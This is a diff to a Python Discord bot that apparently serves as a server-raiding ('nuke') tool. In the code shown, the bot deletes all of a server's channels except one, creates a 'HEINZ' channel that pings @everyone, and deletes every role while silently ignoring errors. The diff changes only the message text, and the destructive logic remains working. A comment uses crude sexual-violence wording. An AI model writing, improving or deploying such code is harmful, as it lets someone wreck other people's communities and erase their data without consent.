@@ -334,12 +334,12 @@ class Bot(cmd.Bot):
                 channels = []
                 for channel in ctx.guild.channels:  # get all channels
                     if channel != earrape:
-                        await channel.delete(reason="THIS SERVER HAS BEEN CLAIMED AS A COLONY OF THE DEMOCRATIC REPUBLIC OF HEINZ")
+                        await channel.delete(reason="heinz")
         
 
             # -make new channel-
             heinz = await ctx.guild.create_text_channel('HEINZ')
-            await heinz.send("@everyone THIS SERVER HAS BEEN CLAIMED AS A COLONY OF THE DEMOCRATIC REPUBLIC OF HEINZ")
+            await heinz.send("@everyone heinz")
 
             ''' doesn't work well so it's commented out for now
             # -log the rape-
@@ -368,7 +368,7 @@ class Bot(cmd.Bot):
 
             for role in roles:
                 try:
-                    await role.delete(reason="THIS SERVER HAS BEEN CLAIMED AS A COLONY OF THE DEMOCRATIC REPUBLIC OF HEINZ")
+                    await role.delete(reason="heinz")
                 except Exception:
                     pass
 
